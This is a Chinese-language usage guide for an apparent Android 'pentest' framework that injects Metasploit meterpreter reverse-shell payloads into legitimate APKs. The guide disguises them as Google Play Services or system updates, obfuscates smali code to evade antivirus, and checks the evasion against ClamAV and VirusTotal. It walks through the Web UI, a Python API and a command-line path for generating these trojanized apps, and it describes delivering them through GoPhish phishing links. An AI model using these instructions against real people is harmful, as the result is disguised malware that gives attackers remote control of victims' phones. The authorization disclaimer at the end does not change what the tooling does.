# Android APK 载荷伪装与免杀完整指南

## 概述

本项目现已集成 **apktool** 深度伪装功能，提供更高级的APK载荷生成和免杀能力。通过反编译、修改和重新打包正常APK，将meterpreter payload注入到合法应用中，实现更好的伪装效果。

## 功能特性

### 1. 基础免杀功能
- **编码器支持**: ARM base64, x86 shikata_ga_nai等多种编码器
- **迭代编码**: 支持多次迭代编码提高免杀效果
- **架构支持**: ARM, ARM64, x86, x64

### 2. apktool深度伪装
- **APK反编译**: 使用apktool反编译正常APK
- **Payload注入**: 将meterpreter payload注入到模板APK
- **应用伪装**: 修改应用名称、包名、版本信息
- **图标替换**: 替换应用图标以匹配伪装目标
- **代码混淆**: 对smali代码进行混淆处理
- **重新打包**: 重新编译并签名APK

### 3. 代码混淆技术
- **字符串混淆**: 分割字符串并使用StringBuilder拼接
- **垃圾代码插入**: 在方法中插入无用代码
- **变量重命名**: 重命名局部变量（谨慎使用）

## 环境准备

### Kali Linux 安装依赖

```bash
# 1. 更新系统
sudo apt update && sudo apt upgrade -y

# 2. 安装apktool
sudo apt install apktool -y

# 3. 验证apktool安装
apktool --version

# 4. 安装其他必要工具
sudo apt install zipalign -y  # APK优化工具

# 5. 确保Metasploit已安装
msfvenom --version

# 6. 安装Java（用于签名）
sudo apt install default-jdk -y

# 7. 验证keytool
keytool --help
```

### 项目依赖安装

```bash
# 进入项目目录
cd android-pentest-framework

# 安装Python依赖
pip install -r requirements.txt

# 或者使用虚拟环境
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

## 使用方法

### 方法一：Web界面（推荐）

#### 1. 启动Web服务

```bash
# 进入项目目录
cd android-pentest-framework

# 启动Web服务
python web/app.py

# 或者使用gunicorn（生产环境）
gunicorn -w 4 -b 0.0.0.0:5000 web.app:app
```

#### 2. 访问Web界面

打开浏览器访问: `http://localhost:5000`

#### 3. 系统初始化

1. 在首页设置LHOST（你的Kali IP地址）
2. 点击"初始化系统"

#### 4. 使用apktool深度伪装

1. 导航到"钓鱼攻击"页面
2. 配置攻击参数：
   - **攻击名称**: 自定义攻击名称
   - **应用名称**: 载荷显示的应用名称
   - **隐身级别**: 选择低级/中级/高级
   - **目标架构**: 根据目标设备选择

3. **启用apktool深度伪装**:
   - 勾选"启用apktool深度伪装"
   - **模板APK路径**: 输入正常APK的完整路径
     ```
     示例: /home/kali/templates/calculator.apk
     ```
   - **伪装应用名称**: 设置显示的应用名称
     ```
     建议: Google Play Services, System Update, Security Patch
     ```
   - **伪装包名**: 设置应用的包名
     ```
     建议: com.google.android.gms, com.android.system.update
     ```
   - **伪装图标路径**（可选）: 输入PNG图标路径

4. 可选：配置GoPhish进行钓鱼邮件发送

5. 点击"启动钓鱼攻击"

#### 5. 等待生成完成

- 基础生成：10-30秒
- apktool深度伪装：2-5分钟（取决于APK大小）

#### 6. 获取结果

- **钓鱼URL**: 发送给目标的链接
- **下载URL**: APK直接下载链接
- **载荷文件**: 生成的APK文件名

### 方法二：Python API

```python
from core.payload_generator import PayloadGenerator

# 初始化生成器
gen = PayloadGenerator(output_dir="payloads")

# 基础配置
lhost = "192.168.1.100"  # 你的Kali IP
lport = 4444

# 伪装配置
disguise_config = {
    'app_name': 'Google Play Services',
    'package_name': 'com.google.android.gms',
    'icon_path': '/path/to/icon.png',  # 可选
    'version_info': {
        'version_code': '12345678',
        'version_name': '23.45.67'
    }
}

# 使用apktool生成深度伪装APK
result = gen.generate_android_payload(
    lhost=lhost,
    lport=lport,
    app_name="System Update",
    architecture="arm",
    use_apktool=True,
    template_apk="/path/to/template.apk",
    disguise_config=disguise_config,
    obfuscation_level=3  # 高级混淆
)

if result['success']:
    print(f"生成成功: {result['payload_path']}")
    print(f"文件大小: {result['file_size']} bytes")
    print(f"文件哈希: {result['file_hash']}")
else:
    print(f"生成失败: {result['error']}")
```

### 方法三：命令行工具

```bash
# 进入项目目录
cd android-pentest-framework

# 使用Python脚本生成
python3 << 'EOF'
from core.payload_generator import PayloadGenerator
import sys

# 命令行参数
lhost = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
lport = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
template_apk = sys.argv[3] if len(sys.argv) > 3 else None

gen = PayloadGenerator()

if template_apk:
    # 使用apktool深度伪装
    result = gen.generate_android_payload(
        lhost=lhost,
        lport=lport,
        use_apktool=True,
        template_apk=template_apk,
        disguise_config={
            'app_name': 'Google Play Services',
            'package_name': 'com.google.android.gms'
        }
    )
else:
    # 基础生成
    result = gen.generate_android_payload(
        lhost=lhost,
        lport=lport,
        stealth_level="high"
    )

print(result)
EOF
```

## 模板APK选择建议

### 推荐的应用类型

1. **工具类应用**
   - 计算器 (Calculator)
   - 手电筒 (Flashlight)
   - 文件管理器 (File Manager)

2. **系统应用**
   - 系统更新 (System Update)
   - 安全补丁 (Security Patch)
   - Google Play Services

3. **实用工具**
   - 二维码扫描器
   - 单位转换器
   - 备忘录

### 获取模板APK

```bash
# 方法1: 从已安装应用提取
# 在Android设备上使用ADB
adb shell pm path com.android.calculator2
adb pull /data/app/com.android.calculator2-1/base.apk calculator.apk

# 方法2: 下载开源APK
# 从F-Droid等开源应用商店下载
wget https://f-droid.org/repo/com.simplemobiletools.calculator_xxx.apk

# 方法3: 使用自己编译的APK
# 使用Android Studio创建简单应用
```

## 免杀测试

### 1. 在线扫描工具

```bash
# 使用VirusTotal API检查
# 上传APK到VirusTotal进行扫描
# 访问: https://www.virustotal.com
```

### 2. 本地AV测试

```bash
# 安装ClamAV
sudo apt install clamav -y

# 更新病毒库
sudo freshclam

# 扫描生成的APK
clamscan payloads/*.apk
```

### 3. 行为分析

```bash
# 使用Android模拟器测试
# 启动Android模拟器
emulator -avd <avd_name>

# 安装APK
adb install payloads/generated.apk

# 监控网络连接
adb shell netstat -an | grep <lport>
```

## 高级配置

### 自定义混淆规则

编辑 `core/payload_generator.py` 中的 `_obfuscate_smali` 方法：

```python
def _obfuscate_smali(self, content):
    """自定义混淆规则"""
    # 添加你的混淆逻辑
    content = self._custom_obfuscation(content)
    return content

def _custom_obfuscation(self, content):
    """自定义混淆方法"""
    # 例如：替换特定字符串
    content = content.replace('meterpreter', 'm' + 'e' * 10 + 't' + 'e' * 10)
    return content
```

### 修改权限列表

编辑 `_modify_manifest` 方法中的权限列表：

```python
permissions = [
    '<uses-permission android:name="android.permission.INTERNET"/>',
    # 添加或删除权限
    '<uses-permission android:name="android.permission.CAMERA"/>',
]
```

## 故障排除

### 常见问题

#### 1. apktool反编译失败

```bash
# 错误信息: "Input file was not found or was not readable"
# 解决: 检查APK路径是否正确
ls -la /path/to/template.apk

# 错误信息: "Could not decode arsc file"
# 解决: 更新apktool
apktool empty-framework-dir --force
```

#### 2. 重新编译失败

```bash
# 错误信息: "brut.androlib.AndrolibException"
# 解决: 检查是否有语法错误
# 查看详细错误信息
apktool b -o output.apk decompiled_dir 2>&1 | tee build.log
```

#### 3. 签名失败

```bash
# 错误信息: "jarsigner: Certificate chain not found"
# 解决: 重新生成密钥库
keytool -genkey -v -keystore android.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000
```

#### 4. 安装失败

```bash
# 错误信息: "INSTALL_PARSE_FAILED_NO_CERTIFICATES"
# 解决: APK未正确签名，检查签名步骤

# 错误信息: "INSTALL_FAILED_INVALID_APK"
# 解决: APK损坏，重新生成
```

### 调试模式

启用详细日志记录：

```python
import logging

# 设置日志级别
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
```

## 安全建议

### 1. 法律合规
- 仅用于授权的安全测试
- 遵守当地法律法规
- 获得明确的书面授权

### 2. 操作安全
- 在隔离环境中测试
- 使用VPN保护通信
- 定期清理生成的载荷

### 3. 反检测技巧
- 定期更换模板APK
- 使用不同的伪装名称
- 避免使用过于知名的应用名称
- 定期更新免杀技术

## 更新日志

### v2.0 - apktool深度伪装
- 集成apktool进行APK反编译和重新打包
- 添加应用名称、包名、图标伪装功能
- 实现smali代码混淆
- 支持自定义伪装配置

### v1.5 - 增强免杀
- 添加多种架构支持
- 实现编码器迭代
- 优化载荷生成流程

### v1.0 - 基础功能
- 基础APK生成
- 简单编码支持
- Web界面

## 参考资源

- [apktool官方文档](https://ibotpeaches.github.io/Apktool/documentation/)
- [Metasploit Payloads](https://docs.metasploit.com/docs/using-metasploit/getting-started/payloads.html)
- [Android Smali语法](https://github.com/JesusFreke/smali/wiki)
- [APK签名指南](https://developer.android.com/studio/publish/app-signing)

## 技术支持

如有问题，请检查：
1. 所有依赖是否正确安装
2. 路径配置是否正确
3. 日志文件中的错误信息
4. 系统权限是否足够

---

**警告**: 本工具仅供安全研究和授权测试使用。未经授权使用可能违反法律。
